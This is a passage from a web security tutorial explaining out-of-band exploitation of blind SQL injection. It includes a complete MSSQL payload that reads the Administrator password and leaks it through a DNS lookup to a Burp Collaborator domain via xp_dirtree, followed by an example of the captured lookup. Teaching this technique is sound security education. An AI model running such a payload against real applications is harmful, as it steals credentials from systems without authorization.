Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:

`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree` `"//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`

This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This will result in a DNS lookup like the following, allowing you to view the captured password:

`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`

Out-of-band (OAST) techniques are an extremely powerful way to detect and exploit blind SQL injection, due to the highly likelihood of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.
